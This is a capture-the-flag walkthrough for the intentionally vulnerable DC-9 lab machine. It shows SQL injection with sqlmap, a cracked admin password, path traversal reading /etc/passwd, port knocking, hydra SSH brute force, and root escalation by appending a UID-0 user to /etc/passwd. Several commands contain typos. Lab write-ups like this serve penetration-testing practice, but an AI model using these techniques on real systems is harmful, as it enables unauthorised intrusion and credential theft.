# DC-9-Walkthro9ugh
DC 9 Walkthrough 

DC-9 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.

The ultimate goal of this challenge is to get root and to read the one and only flag.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.




 # Scaning
  
  ### Reconnaissance 
  
Sudo netdiscover 

![Screenshot from 2023-01-27 15-28-48](https://user-images.githubusercontent.com/108471951/215263858-082ed825-2045-4932-8ae6-968c83f08a60.png)





### Nmap

nmap -sV -sC 192.168.0.114

![Screenshot from 2023-01-27 15-29-54](https://user-images.githubusercontent.com/108471951/215263906-ffc64d5e-6ce4-419c-8875-166a145e95ee.png)

nothing found in the namp result





### http 

#### visited website 

192.168.0.114

found records, search page and login portal


![Screenshot from 2023-01-27 15-32-35](https://user-images.githubusercontent.com/108471951/215264747-0f473527-c8fd-4005-99da-14f40ffcd015.png)



![Screenshot from 2023-01-27 15-32-47](https://user-images.githubusercontent.com/108471951/215264756-c7d19641-d1a6-4ced-bd0a-693396d205be.png)



![Screenshot from 2023-01-27 15-32-54](https://user-images.githubusercontent.com/108471951/215264760-c671defa-1e99-4628-a9c7-3f3ffa98b882.png)








### BurpSuite  

found sql vulnerability in search 


![Screenshot from 2023-01-27 15-37-14](https://user-images.githubusercontent.com/108471951/215264843-6ba82037-c40e-4280-a27f-a73a604529d3.png)

copied the burp requet as a text file dc9req.txt 
  
  
  
  
  
### Sqlmap
 
sqlmap -r dc9req.txt --dbs --batch

![Screenshot from 2023-01-27 15-38-56](https://user-images.githubusercontent.com/108471951/215264902-34e46de8-6154-485f-b2fd-22e0fb9254bb.png)






I got databases

![Screenshot from 2023-01-27 15-41-49](https://user-images.githubusercontent.com/108471951/215264981-04e5b990-3f00-4d0f-aa65-638865c0ff35.png)







### Enumuration



sqlmap -r dc9req.txt -D users --batch

![Screenshot from 2023-01-27 15-41-56](https://user-images.githubusercontent.com/108471951/215265055-2fc12d58-ab66-4f39-8396-b35249bb5a2c.png)






found users names and passwords

![Screenshot from 2023-01-27 15-42-02](https://user-images.githubusercontent.com/108471951/215265074-bc095131-f332-4e82-ae6a-926d9efea328.png)

made the users as users.txt and passwords as pass.txt





sqlmap -r dc9req.txt -D Staff --batch


![Screenshot from 2023-01-27 15-52-08](https://user-images.githubusercontent.com/108471951/215265226-6bce32ad-5eaf-48de-8785-dc0f5d633170.png)

found username admin and password but as u can see password in hash formate 





IN crackstation.net i decrypted the hash

https://crackstation.net/


![Screenshot from 2023-01-27 16-05-43](https://user-images.githubusercontent.com/108471951/215265474-2e3f8884-2d28-4211-9a92-809dbbf4e3fc.png)


I got the password









### http


with the user name admin and password transorbitall i got login to the website as admin


![Screenshot from 2023-01-27 16-06-21](https://user-images.githubusercontent.com/108471951/215265532-34163c06-17b0-4c61-bc6b-4f20eef16df6.png)







#### http://192.168.0.114/welcome.php?file=../../../../../../../etc/passwd

![Screenshot from 2023-01-27 16-07-05](https://user-images.githubusercontent.com/108471951/215265590-dbf9b938-5b3e-4324-9dee-4daf64979b90.png)



![Screenshot from 2023-01-27 16-08-45](https://user-images.githubusercontent.com/108471951/215265597-24bfe71b-5bd4-4508-93ab-ea4db673cdc5.png)

as we can see there is no login for shh 





But as u can see the ssh port 22 is closed 


![Screenshot from 2023-01-27 16-09-07](https://user-images.githubusercontent.com/108471951/215265660-46b49973-3691-4f0b-9e5c-da68ed0a063b.png)





To open the ssh port


http://192.168.0.114/welcome.php?file=../../../../../../../etc/knockd.conf

![Screenshot from 2023-01-27 16-11-55](https://user-images.githubusercontent.com/108471951/215265699-8571e126-5191-4989-a85a-5dcdd4b13f87.png)

I found some ports 7469,8475,9842 ,By knockig the ports at a time we can open ssh port 








knock 192.168.0.114 7469 8475 9842

![Screenshot from 2023-01-27 16-17-00](https://user-images.githubusercontent.com/108471951/215266612-b164a860-61bf-4b14-9c0a-c2d9b815dbe0.png)






nmap -sV -sC -A -p22 192.168.0.114

![Screenshot from 2023-01-27 16-17-13](https://user-images.githubusercontent.com/108471951/215266673-c205a820-9396-4961-9153-e38a9cd271fa.png)


now ssh port 22 is open






### hydra 


hydra -L users.txt -P pass.txt shh://192.168.0.114

![Screenshot from 2023-01-27 16-21-06](https://user-images.githubusercontent.com/108471951/215266728-e726331a-61f5-4f28-a3d9-c99b9c380d02.png)


I got some login credinatials 






### ssh login

ssh janitor@192.168.0.114

ls -la

![Screenshot from 2023-01-27 16-24-58](https://user-images.githubusercontent.com/108471951/215266786-d49d9b18-ab52-4bf7-b723-3f5392e51d01.png)


I found some secret folder






### enumuration



cd .secrets-for-putin/

ls

found some passwords file 

cat passwords-found-on-post-it-notes.txt



![Screenshot from 2023-01-27 16-26-06](https://user-images.githubusercontent.com/108471951/215266906-ba69a4c2-9a66-4b56-acce-d03482941e02.png)


I copied this passwords and pasted in the pass.txt file which i created before



### hyrda 

again i am doin bruteforce with the passwords which i got now





hydra -L users.txt -P pass.txt shh://192.168.0.114


![Screenshot from 2023-01-27 16-33-59](https://user-images.githubusercontent.com/108471951/215267052-24c1d16a-1ff8-43b1-8757-f8418eb89d97.png)


got one new user credintails 





### ssh



ssh fredf@192.168.0.114

sudo -l 


![Screenshot from 2023-01-27 16-35-36](https://user-images.githubusercontent.com/108471951/215267146-8a44da20-a09a-4e90-b963-e7f27c0d67f3.png)

As we can see there is no need of passwd required for root in /opt/devtuff/dist/test/test

so I can create a root user there 







openssl paaswd -1 -salt craw 123456


![Screenshot from 2023-01-28 16-05-09](https://user-images.githubusercontent.com/108471951/215267244-d7c907e8-3e6f-438e-8be9-97ca3ce13549.png)

user name craw paswd 123456






cd //opt/devtuff/dist/test


eco 'craw:$1$craw$ldNVG4fm2XzHpzdZzWCqx0:0:0::/root:/bin/bash' >> /tmp/ak


sudo .test /tmp/ak /etc/passwd

su craw


![Screenshot from 2023-01-28 16-05-31](https://user-images.githubusercontent.com/108471951/215267351-9a8cd713-278a-4196-b2c5-c84922a45c8f.png)






now we are login as root user with user craw


cd /root

ls

cat theflag.txt


![Screenshot from 2023-01-28 16-05-39](https://user-images.githubusercontent.com/108471951/215267395-fb4b1525-9a1e-49bc-90ff-fadef1c7bc5a.png)









Successfully found the flag  


![Screenshot from 2023-01-28 16-05-52](https://user-images.githubusercontent.com/108471951/215267402-04c917fb-60d1-4f45-91ef-1dcc57cd22ec.png)





@robinpaul

#robinpaul

